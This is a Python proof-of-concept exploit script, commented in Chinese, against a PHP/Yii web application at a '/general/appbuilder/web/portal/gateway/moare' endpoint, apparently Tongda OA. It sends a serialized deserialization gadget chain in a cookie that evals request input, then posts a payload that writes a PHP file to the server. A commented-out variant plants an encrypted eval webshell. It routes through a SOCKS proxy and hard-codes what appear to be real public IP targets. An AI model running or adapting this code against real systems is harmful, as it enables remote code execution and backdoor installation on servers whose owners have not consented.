import json
import requests
import xlsx_lock_write

def poc_post(domain_or_ip):
    # 设置目标URL的域名部分
    target = domain_or_ip

    # 设置代理服务器的地址
    proxy_url = 'socks5://127.0.0.1:10808'

    # 设置代理配置
    proxies = {
        'http': proxy_url,
        'https': proxy_url
    }

    # 设置目标URL
    url = f'http://{target}/general/appbuilder/web/portal/gateway/moare?a=1'

    # 设置请求头部
    headers = {
        'Host': target,
        'User-Agent': 'python-requests/2.31.0', #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '',
        'Connection': 'close',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': '_COOKIE=8a987cdbe51b7fe8c0efaf47430b18b96a1477de4a08291eef0f7164bd1b5a9cO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A8%3A%7Bs%3A32%3A%22%00yii%5Credis%5CConnection%00unixSocket%22%3Bi%3A0%3Bs%3A8%3A%22hostname%22%3Bs%3A13%3A%22www.baidu.com%22%3Bs%3A4%3A%22port%22%3Bs%3A3%3A%22443%22%3Bs%3A17%3A%22connectionTimeout%22%3Bi%3A30%3Bs%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A8%3A%22database%22%3BN%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A32%3A%22yii%5Ccaching%5CExpressionDependency%22%3A2%3A%7Bs%3A10%3A%22expression%22%3Bs%3A23%3A%22eval%28%24_REQUEST%5B%27img%27%5D%29%3B%22%3Bs%3A8%3A%22reusable%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A9%3A%22isChanged%22%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D%7D%7D%7D%7D%7D',
        'Content-Length': '81',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # 设置请求正文
    # data = {'img': 'file_put_contents("../../test.txt","test");'}
    # data = {'img': 'img=file_put_contents("../../shell.php","<?php+echo+'aa';");'}
    data = 'img=file_put_contents("../../test1.php","<?php+phpinfo();");'
    # data = { 'img': 'file_put_contents("../../test.php", "<?php@error_reporting(0);session_start();$key=\"a6e392b0005800ed\";$_SESSION[\'k\']=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded(\'openssl\')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,\"AES128\",$key);}$arr=explode(\'|\',$post);$func=$arr[0];$params=$arr[1];classC{publicfunction__invoke($p){eval($p.\"\");}}@call_user_func(newC(),$params);?>);'}

    # 发送POST请求
    response = requests.post(url, headers=headers, data=data, proxies=proxies)

    # 输出响应，将响应包中的unicode转为中文并且json可视化
    decoded_text = bytes(response.text, 'utf-8').decode('unicode_escape')
    formatted_response = json.dumps(decoded_text, indent=4)
    # if response.status_code == 500:  # 检查异常信息是否包含状态码为500的信息,高亮绿色
    #     print(target, "状态码:500")
    #     # print(target, '响应内容:', formatted_response)
    # else:
    print(target, '状态码:', response.status_code)

    status_code = response.status_code
    response_content = formatted_response

    # xlsx_lock_write.write_to_excel(target, status_code, response_content)

    return target, status_code, response_content


if __name__ == '__main__':

    target = '112.94.31.75:5050'
    # target = '82.157.140.54:8888'
    poc_post(target)
